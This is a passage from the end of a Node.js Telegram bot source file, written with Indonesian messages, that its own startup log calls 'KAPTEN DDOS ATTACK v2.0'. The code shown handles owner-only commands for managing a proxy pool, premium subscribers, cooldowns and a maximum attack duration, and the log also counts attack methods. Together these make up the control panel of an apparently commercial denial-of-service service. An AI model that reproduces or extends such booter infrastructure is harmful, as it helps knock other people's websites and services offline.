  bot.sendMessage(msg.chat.id,
`\`\`\`
Proxy List (${proxyPool.length} total)

${list}${proxyPool.length > 50 ? `\n... +${proxyPool.length - 50} lagi` : ''}

Format tambah:
/addproxy [ip] [port]
/addproxy [ip] [port] [user] [pass]
/addproxylist  (kirim banyak sekaligus)
\`\`\``, { parse_mode: 'Markdown' });
});

bot.onText(/\/reloadproxy/, (msg) => {
  if (!isOwner(msg.from.id)) return;
  const n = loadProxies();
  bot.sendMessage(msg.chat.id,
`\`\`\`
✅ Proxy Di-reload

Total : ${n} proxy
\`\`\``, { parse_mode: 'Markdown' });
});

bot.onText(/\/clearproxy/, (msg) => {
  if (!isOwner(msg.from.id)) return;
  fs.writeFileSync(PROXY_FILE, '# ip:port atau ip:port:user:pass\n');
  loadProxies();
  bot.sendMessage(msg.chat.id, '✅ Semua proxy dihapus.');
});

// ── Owner: prem management ───────────────────────────────────
bot.onText(/\/addprem (.+)/, (msg, match) => {
  if (!isOwner(msg.from.id)) return;
  const uid  = match[1].trim();
  const prem = loadPrem();
  if (!prem.includes(uid)) { prem.push(uid); savePrem(prem); }
  bot.sendMessage(msg.chat.id, `✅ \`${uid}\` ditambahkan ke premium.`, { parse_mode: 'Markdown' });
});

bot.onText(/\/delprem (.+)/, (msg, match) => {
  if (!isOwner(msg.from.id)) return;
  const uid  = match[1].trim();
  const prem = loadPrem().filter(x => x !== uid);
  savePrem(prem);
  bot.sendMessage(msg.chat.id, `✅ \`${uid}\` dihapus dari premium.`, { parse_mode: 'Markdown' });
});

bot.onText(/\/listprem/, (msg) => {
  if (!isOwner(msg.from.id)) return;
  const prem = loadPrem();
  bot.sendMessage(msg.chat.id, prem.length ? `Premium:\n${prem.map((u,i)=>`${i+1}. \`${u}\``).join('\n')}` : 'Kosong.', { parse_mode: 'Markdown' });
});

bot.onText(/\/setcd (\d+)/, (msg, match) => {
  if (!isOwner(msg.from.id)) return;
  const cfg = loadCd(); cfg.cd = parseInt(match[1]); saveCd(cfg);
  bot.sendMessage(msg.chat.id, `Cooldown per-user: ${cfg.cd}s`);
});

bot.onText(/\/setmax (\d+)/, (msg, match) => {
  if (!isOwner(msg.from.id)) return;
  const cfg = loadCd(); cfg.max = parseInt(match[1]); saveCd(cfg);
  bot.sendMessage(msg.chat.id, `Max durasi: ${cfg.max}s`);
});

console.log(`[KAPTEN DDOS ATTACK] v2.0 Online. Owner: ${OWNER_ID} | Methods: ${Object.keys(METHODS).length} | Proxies: ${proxyPool.length}`);
